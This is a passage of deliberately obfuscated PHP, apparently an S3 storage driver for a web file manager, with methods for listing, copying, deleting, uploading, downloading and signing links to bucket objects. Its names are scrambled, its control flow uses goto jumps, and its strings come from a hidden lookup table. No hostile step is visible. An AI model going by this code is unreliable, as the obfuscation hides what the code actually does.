"\x28{$cßµßÛÆ¨¦}\51{$EÏÖ¬¦ÃÉ¦}"; if (!in_array_not_case($F¬¹œÖ‚ç, $E»‘ì…ê‹ñ)) { return $F¬¹œÖ‚ç; } } goto bŞ»»Ÿîä; bŞ»»Ÿîä: return $F¬¹œÖ‚ç; goto bÈƒ—‘Ğµ; c©¶§…İ¿: $E°‹‡¤ğó =& $_SERVER[¾÷]; $C…å‹É›°ğ = $this->listPath($CÅÓĞªè, !0); $C…å‹É›°ğ = array_merge($C…å‹É›°ğ[$E°‹‡¤ğó[84]], $C…å‹É›°ğ[$E°‹‡¤ğó[83]]); goto CâëÏÔÅÉ®; CâëÏÔÅÉ®: $E»‘ì…ê‹ñ = array_to_keyvalue($C…å‹É›°ğ, $E°‹‡¤ğó[43], $E°‹‡¤ğó[38]); $EÏÖ¬¦ÃÉ¦ = $E°‹‡¤ğó[104] . get_path_ext($dµØŸºò¶œ); $EÏÖ¬¦ÃÉ¦ = $EÏÖ¬¦ÃÉ¦ == $E°‹‡¤ğó[104] || $Få†Ïµ“¾¼ ? $E°‹‡¤ğó[43] : $EÏÖ¬¦ÃÉ¦; goto eÙô³ÕŒéÈ; bÈƒ—‘Ğµ: } public function listAllFiles($Dˆ¢¸±—Ä, $D—çµù‰ô, $CÊ˜½ëõÅ = array()) { goto c¾µ¬²¯Œ¾; dàÖÄÚ‡Óƒ: $Dˆ¢¸±—Ä = trim($Dˆ¢¸±—Ä, $Bœ«ƒºãìª[18]); foreach ($D—çµù‰ô as $a­ÇÕº¥ƒ) { $e¥… ë¢ø = ltrim(substr(trim($a­ÇÕº¥ƒ, $Bœ«ƒºãìª[18]), strlen($Dˆ¢¸±—Ä)), $Bœ«ƒºãìª[18]); $E˜´ğâÔ = array_merge($E˜´ğâÔ, $this->slicePath($e¥… ë¢ø)); } $DÃ«Çî¦¹ = array(); goto F›Ïñä¾Íá; F›Ïñä¾Íá: foreach (array_unique($E˜´ğâÔ) as $a­ÇÕº¥ƒ) { $C¢Ô‚´Ìë = array($Bœ«ƒºãìª[85] => $this->getPathOuter($Bœ«ƒºãìª[18] . $Dˆ¢¸±—Ä . $Bœ«ƒºãìª[18] . $a­ÇÕº¥ƒ), $Bœ«ƒºãìª[86] => 1, $Bœ«ƒºãìª[87] => 0); if (substr($a­ÇÕº¥ƒ, -1) != $Bœ«ƒºãìª[18]) { $C¢Ô‚´Ìë[$Bœ«ƒºãìª[86]] = 0; $e¦²ˆ—˜Œ‰ = $this->getPath($Dˆ¢¸±—Ä . $Bœ«ƒºãìª[18] . $a­ÇÕº¥ƒ); $C¢Ô‚´Ìë[$Bœ«ƒºãìª[87]] = isset($CÊ˜½ëõÅ[$e¦²ˆ—˜Œ‰]) ? $CÊ˜½ëõÅ[$e¦²ˆ—˜Œ‰] : $this->size($e¦²ˆ—˜Œ‰); } $DÃ«Çî¦¹[] = $C¢Ô‚´Ìë; } return $DÃ«Çî¦¹; goto BÜ¨ŠÀâ«Ÿ; c¾µ¬²¯Œ¾: $Bœ«ƒºãìª =& $_SERVER[¾÷]; if (empty($D—çµù‰ô)) { return array(); } $E˜´ğâÔ = array(); goto dàÖÄÚ‡Óƒ; BÜ¨ŠÀâ«Ÿ: } public function slicePath($eßÜ×áà¯) { $f¶Ñ‚šÁ†ê =& $_SERVER[¾÷]; $eÁ¥–ÌíµÁ = explode($f¶Ñ‚šÁ†ê[18], trim($eßÜ×áà¯, $f¶Ñ‚šÁ†ê[18])); $c¹–İÌ•Û¹ = 0; do { ++$c¹–İÌ•Û¹; $bÀæ¬†ç¬½[] = implode($f¶Ñ‚šÁ†ê[18], array_slice($eÁ¥–ÌíµÁ, 0, $c¹–İÌ•Û¹)) . $f¶Ñ‚šÁ†ê[18]; } while ($c¹–İÌ•Û¹ < count($eÁ¥–ÌíµÁ)); $bÀæ¬†ç¬½[count($eÁ¥–ÌíµÁ) - 1] = $eßÜ×áà¯; return $bÀæ¬†ç¬½; } public function getHost() { $e½ÜİÙˆ±ö =& $_SERVER[¾÷]; $CÍ´ŞÂ×Ïô = parse_url(trim($this->domain, $e½ÜİÙˆ±ö[18])); $a´ÊĞ‹·‰È = isset($CÍ´ŞÂ×Ïô[$e½ÜİÙˆ±ö[183]]) ? $CÍ´ŞÂ×Ïô[$e½ÜİÙˆ±ö[183]] : http_type(); $f•¦ËÃõØ = isset($CÍ´ŞÂ×Ïô[$e½ÜİÙˆ±ö[184]]) ? $CÍ´ŞÂ×Ïô[$e½ÜİÙˆ±ö[184]] : $CÍ´ŞÂ×Ïô[$e½ÜİÙˆ±ö[85]]; if (isset($CÍ´ŞÂ×Ïô[$e½ÜİÙˆ±ö[185]])) { $f•¦ËÃõØ .= $e½ÜİÙˆ±ö[14] . $CÍ´ŞÂ×Ïô[$e½ÜİÙˆ±ö[185]]; } return $a´ÊĞ‹·‰È . $e½ÜİÙˆ±ö[186] . $f•¦ËÃõØ; } public function pathEncode($FÚ¤ÒÜ¨ïô) { $d¯œõ„õ¹¯ =& $_SERVER[¾÷]; return str_replace($d¯œõ„õ¹¯[187], $d¯œõ„õ¹¯[18], rawurlencode($FÚ¤ÒÜ¨ïô)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($b½™ääÃß„) { set_timeout(); require_once SDK_DIR . $_SERVER[¾÷][188]; parent::__construct(); $this->_init($b½™ääÃß„); } public function _init($cÂéáãöêµ) { foreach ($cÂéáãöêµ as $A†æ™´ò¤© => $a‰º°­£êÌ) { if (isset($this->{$A†æ™´ò¤©})) { $this->{$A†æ™´ò¤©} = $a‰º°­£êÌ; } } $this->endpoint = $cÂéáãöêµ[$_SERVER[¾÷][189]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($cÅÓÀ°Øß = "\x76\x34") { $this->signVer = $cÅÓÀ°Øß; $this->client->setSignatureVersion($cÅÓÀ°Øß); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto eØ®¼™‘Éå; eØ®¼™‘Éå: $C·â”ï”÷ =& $_SERVER[¾÷]; $bô•¦æŠÏ­ = $this->getBucketCors(); if (!$bô•¦æŠÏ­ || !is_array($bô•¦æŠÏ­)) { return !1; } goto A®ÂÜÄ³î; A®ÂÜÄ³î: if ($bô•¦æŠÏ­[$C·â”ï”÷[190]] != $C·â”ï”÷[191] || $bô•¦æŠÏ­[$C·â”ï”÷[192]] != $C·â”ï”÷[191]) { return !1; } $fç˜äÅ­… = array_map($C·â”ï”÷[193], $bô•¦æŠÏ­[$C·â”ï”÷[194]]); if (!is_array($fç˜äÅ­…)) { $fç˜äÅ­… = array(); } goto bíìÅÆ¸Ï; bíìÅÆ¸Ï: $CÈÌá¨ï¶İ = array($C·â”ï”÷[195], $C·â”ï”÷[196], $C·â”ï”÷[197], $C·â”ï”÷[198], $C·â”ï”÷[199]); $f‰‰ÚÈ‹ñ = array_diff($CÈÌá¨ï¶İ, $fç˜äÅ­…); return empty($f‰‰ÚÈ‹ñ); goto fŒİÉª—ºõ; fŒİÉª—ºõ: } public function mkfile($c¥Îˆ—†´¢, $aôğ†…ƒÖš = '', $C¯ó¦Ã°¶ê = REPEAT_RENAME) { $cÅÇö‡Ò­© = $this->setContent($c¥Îˆ—†´¢, $aôğ†…ƒÖš); if ($cÅÇö‡Ò­© !== !1) { return $this->getPathOuter($c¥Îˆ—†´¢); } return !1; } public function mkdir($EÈã‡«ë¾Ú, $d“Ğ¸‘„ = REPEAT_SKIP) { if (empty($EÈã‡«ë¾Ú)) { return !1; } if ($this->_isFolder($EÈã‡«ë¾Ú)) { return $this->getPathOuter($EÈã‡«ë¾Ú); } $AåÕ¡Š‹ÜË = $this->setContent($EÈã‡«ë¾Ú, $_SERVER[¾÷][43], !0); if ($AåÕ¡Š‹ÜË !== !1) { return $this->getPathOuter($EÈã‡«ë¾Ú); } return !1; } public function copyFile($c÷Ú’Ù“õå, $C§Ôí¿É¹µ, $BõèŒ…á = array()) { $EÌÑÇêÕ‰½ =& $_SERVER[¾÷]; $cÒàä¬ğå• = $this->objectMeta($c÷Ú’Ù“õå); if (!$cÒàä¬ğå•) { return !1; } if ($cÒàä¬ğå•[$EÌÑÇêÕ‰½[87]] <= 1024 * 1024 * 200) { $Bå§Ä‘´é = $this->client->copyObject($this->bucket, $c÷Ú’Ù“õå, $this->bucket, $C§Ôí¿É¹µ, $EÌÑÇêÕ‰½[200], $BõèŒ…á); } else { $Bå§Ä‘´é = $this->client->multiCopyObject($this->bucket, $c÷Ú’Ù“õå, $this->bucket, $C§Ôí¿É¹µ, $BõèŒ…á); } $Bå§Ä‘´é = $Bå§Ä‘´é ? $this->getPathOuter($C§Ôí¿É¹µ) : !1; return $Bå§Ä‘´é; } public function moveFile($c˜Ç¦øïÃ—, $BŞÃ§¶Ô …) { if ($this->copyFile($c˜Ç¦øïÃ—, $BŞÃ§¶Ô …)) { $this->delFile($c˜Ç¦øïÃ—); return $this->getPathOuter($BŞÃ§¶Ô …); } return !1; } public function delFile($eÒÁÆê¨ì§) { return $this->client->deleteObject($this->bucket, $eÒÁÆê¨ì§); } public function delFolder($Aîñóçø®Ö) { goto eï§ë‹º…è; Cµ ùèÒŠ·: return $this->delByBatch($DŠ¹œ…Š—¸[$a‹ø¦¯ ïÄ[84]]); goto F³æšóÎÒ¯; f¡ºô½„Ö: $DŠ¹œ…Š—¸ = $this->fileList($Aîñóçø®Ö); $this->listItemCache = !0; $EêØ¹ªÏ÷ = trim($Aîñóçø®Ö, $a‹ø¦¯ ïÄ[18]) . $a‹ø¦¯ ïÄ[18]; goto AË‡ö”®; eï§ë‹º…è: $a‹ø¦¯ ïÄ =& $_SERVER[¾÷]; if (!$this->exist($Aîñóçø®Ö)) { return !0; } $this->listItemCache = !1; goto f¡ºô½„Ö; AË‡ö”®: if (!empty($Aîñóçø®Ö) && !in_array($EêØ¹ªÏ÷, $DŠ¹œ…Š—¸[$a‹ø¦¯ ïÄ[84]])) { $DŠ¹œ…Š—¸[$a‹ø¦¯ ïÄ[84]][] = $EêØ¹ªÏ÷; } $FØ³Ü‡ ¡ = $this->delByBatch($DŠ¹œ…Š—¸[$a‹ø¦¯ ïÄ[83]]); if (!$FØ³Ü‡ ¡) { return !1; } goto Cµ ùèÒŠ·; F³æšóÎÒ¯: } private function delByBatch($C²çÚÎÎÃç) { foreach (array_chunk($C²çÚÎÎÃç, 1000) as $AÛß»ˆëì) { $EĞëÆË‹„ = $this->client->deleteObjects($this->bucket, $AÛß»ˆëì); if (!$EĞëÆË‹„) { return !1; } } return !0; } public function rename($bµ“•ò¿šœ, $aÛ“„œ’ÚÊ) { return $this->renameObject($bµ“•ò¿šœ, $aÛ“„œ’ÚÊ); } public function listPath($bÛà£Şç´, $EÄÕš¸Ëç‰ = false) { $f‹˜¯ˆäæ¯ =& $_SERVER[¾÷]; $a‹êˆç”© = $this->fileList($bÛà£Şç´, $f‹˜¯ˆäæ¯[18], !0); foreach ($a‹êˆç”©[$f‹˜¯ˆäæ¯[84]] as $E»ˆò­—®× => $BøÅ¬¡à¥•) { $a‹êˆç”©[$f‹˜¯ˆäæ¯[84]][$E»ˆò­—®×] = $this->folderInfo($BøÅ¬¡à¥•, $EÄÕš¸Ëç‰); } foreach ($a‹êˆç”©[$f‹˜¯ˆäæ¯[83]] as $E»ˆò­—®× => $BøÅ¬¡à¥•) { $a‹êˆç”©[$f‹˜¯ˆäæ¯[83]][$E»ˆò­—®×] = $this->fileInfo($BøÅ¬¡à¥•[$f‹˜¯ˆäæ¯[38]], $EÄÕš¸Ëç‰, $BøÅ¬¡à¥•); } return $a‹êˆç”©; } private function fileInfo($b…²Ê©©æ˜, $aŸÈ°õ‰‚ì = false, $CÓ÷È©Ü¹¤ = array()) { goto D¡Š…”£ĞÖ; D¡Š…”£ĞÖ: $A‹í«¸ÉÖÜ =& $_SERVER[¾÷]; $CÔÇÊîÕö = array($A‹í«¸ÉÖÜ[38] => $this->pathThis($b…²Ê©©æ˜), $A‹í«¸ÉÖÜ[85] => $this->getPathOuter($b…²Ê©©æ˜), $A‹í«¸ÉÖÜ[39] => $A‹í«¸ÉÖÜ[201], $A‹í«¸ÉÖÜ[177] => $this->ext($b…²Ê©©æ˜), $A‹í«¸ÉÖÜ[87] => isset($CÓ÷È©Ü¹¤[$A‹í«¸ÉÖÜ[87]]) ? $CÓ÷È©Ü¹¤[$A‹í«¸ÉÖÜ[87]] : 0); if ($aŸÈ°õ‰‚ì) { return $CÔÇÊîÕö; } goto F·Ê¤¤–Ä¢; F·Ê¤¤–Ä¢: $CÔÇÊîÕö[$A‹í«¸ÉÖÜ[202]] = $CÔÇÊîÕö[$A‹í«¸ÉÖÜ[93]] = 0; $CÔÇÊîÕö[$A‹í«¸ÉÖÜ[203]] = $CÔÇÊîÕö[$A‹í«¸ÉÖÜ[204]] = !0; if (empty($CÓ÷È©Ü¹¤)) { $CÓ÷È©Ü¹¤ = $this->objectMeta($b…²Ê©©æ˜); if (!$CÓ÷È©Ü¹¤) { return $CÔÇÊîÕö; } } goto DÉˆ¶Æä¦Ó; DÉˆ¶Æä¦Ó: if (isset($CÓ÷È©Ü¹¤[$A‹í«¸ÉÖÜ[205]])) { $CÔÇÊîÕö[$A‹í«¸ÉÖÜ[93]] = $CÓ÷È©Ü¹¤[$A‹í«¸ÉÖÜ[205]]; } if (isset($CÓ÷È©Ü¹¤[$A‹í«¸ÉÖÜ[87]])) { $CÔÇÊîÕö[$A‹í«¸ÉÖÜ[87]] = $CÓ÷È©Ü¹¤[$A‹í«¸ÉÖÜ[87]]; } return $CÔÇÊîÕö; goto Eğˆˆæ“ä‚; Eğˆˆæ“ä‚: } private function folderInfo($aìĞ©–Å­–, $c½´óÂ“—¤ = false) { goto fİö¤¹§¦Ô; Eâºê”‚ƒŸ: $aìĞ©–Å­– = trim($aìĞ©–Å­–, $C…¸ĞÜèŒ [18]) . $C…¸ĞÜèŒ [18]; $EÌàÔ‘Êã = $this->objectMeta($aìĞ©–Å­–); if (isset($EÌàÔ‘Êã[$C…¸ĞÜèŒ [205]])) { $EĞÉ¬††ÅÖ[$C…¸ĞÜèŒ [202]] = $EÌàÔ‘Êã[$C…¸ĞÜèŒ [205]]; } goto B¨›‡ó—æ; B¨›‡ó—æ: return $EĞÉ¬††ÅÖ; goto FÊĞ­Ô‘Ü; fİö¤¹§¦Ô: $C…¸ĞÜèŒ  =& $_SERVER[¾÷]; $EĞÉ¬††ÅÖ = array($C…¸ĞÜèŒ [38] => $this->pathThis($aìĞ©–Å­–), $C…¸ĞÜèŒ [85] => $this->getPathOuter($C…¸ĞÜèŒ [18] . $aìĞ©–Å­–), $C…¸ĞÜèŒ [39] => $C…¸ĞÜèŒ [86]); if ($c½´óÂ“—¤) { return $EĞÉ¬††ÅÖ; } goto F½á‡Â Õ‡; F½á‡Â Õ‡: $EĞÉ¬††ÅÖ[$C…¸ĞÜèŒ [202]] = $EĞÉ¬††ÅÖ[$C…¸ĞÜèŒ [93]] = 0; $EĞÉ¬††ÅÖ[$C…¸ĞÜèŒ [203]] = $EĞÉ¬††ÅÖ[$C…¸ĞÜèŒ [204]] = !0; if ($aìĞ©–Å­– == $C…¸ĞÜèŒ [43]) { return $EĞÉ¬††ÅÖ; } goto Eâºê”‚ƒŸ; FÊĞ­Ô‘Ü: } private function fileList($E£êå²Ø“, $D‡…¢Šç = '', $F¼Š»‚‹¥ = 0) { goto BÜğé•‡¾Á; BÜğé•‡¾Á: $AŒÂ›™ğìÓ =& $_SERVER[¾÷]; $e£»¹®ˆŸ = rtrim($E£êå²Ø“, $AŒÂ›™ğìÓ[18]) . $AŒÂ›™ğìÓ[18]; $fêŞ¸¹æï = $this->listObjs($e£»¹®ˆŸ, null, null, $D‡…¢Šç); goto BºˆçÛè»ò; BºˆçÛè»ò: if (!$fêŞ¸¹æï) { return array($AŒÂ›™ğìÓ[84] => array(), $AŒÂ›™ğìÓ[83] => array()); } $e·…’Ô°äŸ = $this->listItemCache === !1 ? !1 : !0; $d®µ‰âåÚá = $E£õÕ×¯½Ä = array(); goto EÒÔÛÓ–îï; EÒÔÛÓ–îï: foreach ($fêŞ¸¹æï[$AŒÂ›™ğìÓ[206]] as $Aõ­¬÷‹è‘) { goto b¬®Š ò; b¬®Š ò: $DŸæğ±¢ = $Aõ­¬÷‹è‘[$AŒÂ›™ğìÓ[38]]; if ($DŸæğ±¢ == $e£»¹®ˆŸ) { continue; } $Bä×…Õ Ò = isset($Aõ­¬÷‹è‘[$AŒÂ›™ğìÓ[87]]) ? $Aõ­¬÷‹è‘[$AŒÂ›™ğìÓ[87]] : 0; goto B¬¯ä§˜Ìó; B¬¯ä§˜Ìó: $CÓò‰¶ƒ• = $Bä×…Õ Ò == 0 && substr($DŸæğ±¢, strlen($DŸæğ±¢) - 1, 1) == $AŒÂ›™ğìÓ[18] ? !0 : !1; if ($e·…’Ô°äŸ) { $this->cacheMethod($AŒÂ›™ğìÓ[207], $DŸæğ±¢, $CÓò‰¶ƒ•); $this->cacheMethod($AŒÂ›™ğìÓ[208], $DŸæğ±¢, $Aõ­¬÷‹è‘); } if ($CÓò‰¶ƒ•) { $d®µ‰âåÚá[] = $DŸæğ±¢; continue; } goto A§ÚÏ¦‚µÓ; A§ÚÏ¦‚µÓ: $E£õÕ×¯½Ä[] = $F¼Š»‚‹¥ ? $Aõ­¬÷‹è‘ : $DŸæğ±¢; goto a ÌÇ©ºÑ¸; a ÌÇ©ºÑ¸: } foreach ($fêŞ¸¹æï[$AŒÂ›™ğìÓ[209]] as $Aõ­¬÷‹è‘) { $d®µ‰âåÚá[] = $Aõ­¬÷‹è‘[$AŒÂ›™ğìÓ[38]]; if ($e·…’Ô°äŸ) { $this->cacheMethod($AŒÂ›™ğìÓ[207], $Aõ­¬÷‹è‘[$AŒÂ›™ğìÓ[38]], !0); } } if ($e·…’Ô°äŸ) { $this->cacheMethod($AŒÂ›™ğìÓ[207], $E£êå²Ø“, !0); } goto bÆÖ»„Í; bÆÖ»„Í: return array($AŒÂ›™ğìÓ[84] => $d®µ‰âåÚá, $AŒÂ›™ğìÓ[83] => $E£õÕ×¯½Ä); goto Cç½çÃ”´; Cç½çÃ”´: } private function listObjs($aª›Âİçê, $AŸìÚ…Ç“ = null, $Cµå·—¬æ = null, $B¶Ì‘â­ÓÜ = null) { $CˆÑÄ²ê½¢ =& $_SERVER[¾÷]; $aª›Âİçê = trim($aª›Âİçê, $CˆÑÄ²ê½¢[18]); $a‰®©ÑÌ½ã = empty($aª›Âİçê) ? $CˆÑÄ²ê½¢[43] : $aª›Âİçê . $CˆÑÄ²ê½¢[18]; return $this->client->getBucket($this->bucket, $a‰®©ÑÌ½ã, $AŸìÚ…Ç“, $Cµå·—¬æ, $B¶Ì‘â­ÓÜ, !0); } public function has($f˜·Æå‚„, $Bë¸å”õè = false, $d°‚‰‘ = true) { goto Eî¯›çØÖ; Eî¯›çØÖ: $BäÆî‘Øò‹ =& $_SERVER[¾÷]; $f˜·Æå‚„ = trim($f˜·Æå‚„, $BäÆî‘Øò‹[18]); $C‹Á±˜ª¿Ò = empty($f˜·Æå‚„) ? $BäÆî‘Øò‹[43] : $f˜·Æå‚„ . $BäÆî‘Øò‹[18]; goto eå‡ÔŒîß; eå‡ÔŒîß: $E·æ¬­ã´Û = null; $FÚš…‡÷Ÿê = 500; $aŠ²ˆ³å‡ = $BäÆî‘Øò‹[18]; goto c¸©õÔ¨Îö; aØÔİ×Ë½“: return !1; goto e—áÔ™µ¢¥; c¸©õÔ¨Îö: $EİŠÖäó¯£ = $A“—İÔ†ó‡ = array(); while (!0) { $DÊî¤ËÈ» = $this->listObjs($f˜·Æå‚„, $E·æ¬­ã´Û, $FÚš…‡÷Ÿê, $aŠ²ˆ³å‡); if (!$DÊî¤ËÈ») { break; } $E·æ¬­ã´Û = $DÊî¤ËÈ»[$BäÆî‘Øò‹[210]]; $C©‘“‰êŠô = $DÊî¤ËÈ»[$BäÆî‘Øò‹[206]]; $eŸÉÍŸ›Ä• = $DÊî¤ËÈ»[$BäÆî‘Øò‹[209]]; if (empty($C©‘“‰êŠô) && empty($eŸÉÍŸ›Ä•)) { break; } if (count($C©‘“‰êŠô) == 1 && $C©‘“‰êŠô[0][$BäÆî‘Øò‹[38]] == $C‹Á±˜ª¿Ò) { break; } if ($Bë¸å”õè) { if (count($C©‘“‰êŠô)) { $C©‘“‰êŠô = array_column($C©‘“‰êŠô, $BäÆî‘Øò‹[38]); $EİŠÖäó¯£ = array_merge($EİŠÖäó¯£, $C©‘“‰êŠô); } if (count($eŸÉÍŸ›Ä•)) { $eŸÉÍŸ›Ä• = array_column($eŸÉÍŸ›Ä•, $BäÆî‘Øò‹[38]); $A“—İÔ†ó‡ = array_merge($A“—İÔ†ó‡, $eŸÉÍŸ›Ä•); } if ($E·æ¬­ã´Û === null) { break; } continue; } if ($d°‚‰‘) { if (!empty($C©‘“‰êŠô)) { if (count($C©‘“‰êŠô) > 1 || isset($C©‘“‰êŠô[0][$BäÆî‘Øò‹[38]]) && $C©‘“‰êŠô[0][$BäÆî‘Øò‹[38]] != $C‹Á±˜ª¿Ò) { return !0; } } } else { if (!empty($eŸÉÍŸ›Ä•)) { return !0; } } if ($E·æ¬­ã´Û === null) { break; } } if ($Bë¸å”õè) { $EİŠÖäó¯£ = array_diff($EİŠÖäó¯£, array($C‹Á±˜ª¿Ò)); $EİŠÖäó¯£ = count(array_unique($EİŠÖäó¯£)); $A“—İÔ†ó‡ = count(array_unique($A“—İÔ†ó‡)); return array($BäÆî‘Øò‹[211] => $EİŠÖäó¯£, $BäÆî‘Øò‹[212] => $A“—İÔ†ó‡); } goto aØÔİ×Ë½“; e—áÔ™µ¢¥: } public function listAll($f…õ·’Ù†ø) { $FºÏçàÖÈó =& $_SERVER[¾÷]; $F±ˆ¬Ê± = $this->fileList($f…õ·’Ù†ø, $FºÏçàÖÈó[43], !0); $E×ğ‡¢¦‚ƒ = array(); foreach ($F±ˆ¬Ê±[$FºÏçàÖÈó[83]] as $A…£›ÙÂù) { $E×ğ‡¢¦‚ƒ[$A…£›ÙÂù[$FºÏçàÖÈó[38]]] = $A…£›ÙÂù[$FºÏçàÖÈó[87]]; } foreach ($F±ˆ¬Ê±[$FºÏçàÖÈó[84]] as $A…£›ÙÂù) { if (is_string($A…£›ÙÂù)) { $E×ğ‡¢¦‚ƒ[$A…£›ÙÂù] = 0; } } return $this->listAllFiles($f…õ·’Ù†ø, array_keys($E×ğ‡¢¦‚ƒ), $E×ğ‡¢¦‚ƒ); } public function canRead($AÉŸ„„£¨‘) { $C§‰˜ ò‚° =& $_SERVER[¾÷]; $A¦†Ğéíéå = $this->client->getAccessControlPolicy($this->bucket, $AÉŸ„„£¨‘); if (!$A¦†Ğéíéå) { return !1; } return in_array($A¦†Ğéíéå, array($C§‰˜ ò‚°[213], $C§‰˜ ò‚°[214], $C§‰˜ ò‚°[215])) ? !0 : !1; } public function canWrite($c°¦Ò¬Ù²) { $A®Ùø¡Ôó =& $_SERVER[¾÷]; $a¼Ø½àò = $this->client->getAccessControlPolicy($this->bucket, $c°¦Ò¬Ù²); if (!$a¼Ø½àò) { return !1; } return in_array($a¼Ø½àò, array($A®Ùø¡Ôó[213], $A®Ùø¡Ôó[214])) ? !0 : !1; } public function getContent($c‚ˆÜ›ÀÈ‘) { return $this->client->getObject($this->bucket, $c‚ˆÜ›ÀÈ‘); } public function setContent($fÆ²×›¾Äï, $B—ËÖĞº°Ä = '', $fˆèØİè° = false) { goto D³Ø§æË³; cÓìñ˜Šº: $e–íŠåÛ³Ó = $this->client->putObject($B—ËÖĞº°Ä, $this->bucket, $fÆ²×›¾Äï, $aÔÕÇ³Š‘[200], array(), $bŞÖ¸‹™ó); if (!$e–íŠåÛ³Ó) { return !1; } if ($fˆèØİè°) { return !0; } goto a¼£¨ŒÃÑœ; D³Ø§æË³: $aÔÕÇ³Š‘ =& $_SERVER[¾÷]; $fÆ²×›¾Äï = $fˆèØİè° ? trim($fÆ²×›¾Äï, $aÔÕÇ³Š‘[18]) . $aÔÕÇ³Š‘[18] : $fÆ²×›¾Äï; $bŞÖ¸‹™ó = get_file_mime(get_path_ext($fÆ²×›¾Äï)); goto cÓìñ˜Šº; a¼£¨ŒÃÑœ: $this->cacheMethod(null, null); $e–íŠåÛ³Ó = $this->copyFile($fÆ²×›¾Äï, $fÆ²×›¾Äï, array($aÔÕÇ³Š‘[216] => $e–íŠåÛ³Ó[$aÔÕÇ³Š‘[217]])); return $e–íŠåÛ³Ó ? !0 : !1; goto aÓÆÃ‚ÜŒÁ; aÓÆÃ‚ÜŒÁ: } public function fileSubstr($fÙ˜»Ù×ç¥, $AŠ’Éƒë‡, $a‡ÔùáÉ) { $BÊœ‡±’·Ã = $AŠ’Éƒë‡ + $a‡ÔùáÉ - 1; return $this->client->getObject($this->bucket, $fÙ˜»Ù×ç¥, array($_SERVER[¾÷][218] => "\x62\x79\x74\145\x73\x3d{$AŠ’Éƒë‡}\55{$BÊœ‡±’·Ã}")); } public function upload($d«Ó©ß‚­Ñ, $E…¿·‰ç‚, $E’¯¤òå¡ = false, $eáéƒÎãˆò = REPEAT_REPLACE) { $Fñ»½Ë‰í =& $_SERVER[¾÷]; $e†âŸÌ»·  = array($Fñ»½Ë‰í[216] => @md5_file($E…¿·‰ç‚)); $Fãø¨Œ–ºƒ = array($Fñ»½Ë‰í[219] => get_file_mime(get_path_ext($d«Ó©ß‚­Ñ))); if (IO::size($E…¿·‰ç‚) <= 1024 * 1024 * 200) { $C“‰´Ç§ÓÆ = $this->client->putObjectFile($E…¿·‰ç‚, $this->bucket, $d«Ó©ß‚­Ñ, $Fñ»½Ë‰í[200], $e†âŸÌ»· , $Fãø¨Œ–ºƒ); return !empty($C“‰´Ç§ÓÆ) ? $this->getPathOuter($d«Ó©ß‚­Ñ) : !1; } $fŒÁ‹æ±¼ = $this->client->multiUploadObject($E…¿·‰ç‚, $this->bucket, trim($d«Ó©ß‚­Ñ, $Fñ»½Ë‰í[18]), $e†âŸÌ»· , $Fãø¨Œ–ºƒ); return $fŒÁ‹æ±¼ ? $this->getPathOuter($d«Ó©ß‚­Ñ) : !1; } public function download($aÂØœ¼ëùÕ, $dãØÉø¾Œ¤) { if (!@is_dir($this->pathFather($dãØÉø¾Œ¤)) && !IO::mkdir($this->pathFather($dãØÉø¾Œ¤))) { return !1; } $A£Î‚”„Çƒ = $this->client->getObject($this->bucket, $aÂØœ¼ëùÕ, array(), $dãØÉø¾Œ¤); return $A£Î‚”„Çƒ !== !1 ? $dãØÉø¾Œ¤ : !1; } public function link($dãíÃ›á‚Ø, $dÛ»ˆê³³ = array()) { $c–¦âŒ•Òµ =& $_SERVER[¾÷]; if ($this->signVer == $c–¦âŒ•Òµ[220]) { return $this->client->getAuthenticatedURL($this->bucket, $dãíÃ›á‚Ø, 3600 * 12, $dÛ»ˆê³³); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($dãíÃ›á‚Ø, $c–¦âŒ•Òµ[18]), 3600 * 12, $this->region, array(), !0, $dÛ»ˆê³³); } public function fileOut($f‘Ç¬†Êø¡, $dÃ±“–ï¨ì = false, $Dà”ù°àè = false, $c¡ÏìÕºá³ = '') { goto Eˆ¿®ãá’Î; FÔ²ôÃ¦Ç: $eª¸—‡­¢ = array($f¤†å¢¹Œ[224] => $dÃ±“–ï¨ì . $f¤†å¢¹Œ[225] . rawurlencode($Dà”ù°àè), $f¤†å¢¹Œ[226] => $bª†¶¨“); $B²šºìŞÇ = $this->link($f‘Ç¬†Êø¡, $eª¸—‡­¢); $this->fileOutLink($B²šºìŞÇ); goto fÁì÷×‰; C£¬ø¢©ºà: $bª†¶¨“ = get_file_mime(get_path_ext($Dà”ù°àè)); if ($bª†¶¨“ == $f¤†å¢¹Œ[221]) { return parent::fileOut($f‘Ç¬†Êø¡, $dÃ±“–ï¨ì, $Dà”ù°àè, $c¡ÏìÕºá³); } $dÃ±“–ï¨ì = $dÃ±“–ï¨ì ? $f¤†å¢¹Œ[222] : $f¤†å¢¹Œ[223]; goto FÔ²ôÃ¦Ç; Eˆ¿®ãá’Î: $f¤†å¢¹Œ =& $_SERVER[¾÷]; if ($this->isFileOutServer()) { return $this->fileOutServer($f‘Ç¬†Êø¡, $dÃ±“–ï¨ì, $Dà”ù°àè, $c¡ÏìÕºá³); } if (!$Dà”ù°àè) { $Dà”ù°àè = $this->pathThis($f‘Ç¬†Êø¡); } goto C£¬ø¢©ºà; fÁì÷×‰: } public function fileOutServer($Dˆ›½…, $D”¾ ¶ÆŸÀ = false, $cÏŒ¹‹ˆ°‹ = false, $F‚ÂÛŠë¬ = '') { parent::fileOut($Dˆ›½…, $D”¾ ¶ÆŸÀ, $cÏŒ¹‹ˆ°‹, $F‚ÂÛŠë¬); } public function fileOutImageServer($eÓ¾‹„ÊáÖ, $F‚—‘ˆŠì = 250) { parent::fileOutImage($eÓ¾‹„ÊáÖ, $F‚—‘ˆŠì); } public function hashMd5($f¥Š®ˆ¿ğÊ, $fÔó´Ä„á = '') { $A…®Ÿ½à†’ =& $_SERVER[¾÷]; $fâ­‹å˜‘Í = $this->objectMeta($f¥Š®ˆ¿ğÊ); if (!$fâ­‹å˜‘Í) { return !1; } $fÔó´Ä„á = $fÔó´Ä„á ? $fÔó´Ä„á : 